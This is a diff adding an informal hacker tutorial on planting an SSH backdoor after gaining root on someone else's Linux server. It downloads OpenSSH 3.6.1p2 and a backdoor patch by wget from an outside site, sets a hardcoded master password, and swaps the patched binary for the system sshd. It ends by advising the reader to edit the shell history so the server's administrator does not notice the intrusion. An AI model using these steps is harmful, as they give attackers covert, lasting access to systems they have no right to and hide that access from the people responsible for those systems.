@@ -1,0 +1,16 @@
+We all know that after gain root, majority of us using shv4,5 or shv7 to make rootkit, how about if we using port 22 for our backdoor? this technick is founded by other person (credit to real author) but i found this methode very usefull.. here we go
+
+after gain root we install openssh-3.6.1p2.tar.
+$ wget www.somesite.com/xpl/openssh-3.6.1p2.tar
+$ tar zxvf openssh-3.6.1p2.tar
+$ cd openssh-3.6.1p2
+$ wget www.somesite/xpl/openssh-3.6.1p2-backdoor.patch
+(here we need to patch some files)
+$ patch -p1 < openssh-3.6.1p2-backdoor.patch
+(edit file backdoor.h #define BACKDOORPASSWD "your.pass.here" ] p/s change to your own password), after editing the password, its time for us to compile the openss.
+$ ./configure --with-ssl-dir=/usr/sbin/
+$ make ; make install
+$ mv /usr/sbin/sshd /usr/sbin/sshd.old
+$ cp sshd /usr/sbin
+$ /etc/init.d/sshd restart .. ur done.
+p/s dont forget to clean your history file, i dont suggest you delete the history file, instead edit it with your fav editor vi;pico;nano or it will to obvious if you delete the file, root will notice it, i hope this tutorial helpfull for those who like to try out making backdoor instead of using shv4,5,7 ..any improvement to this tutorial is very appreciate to make it better.
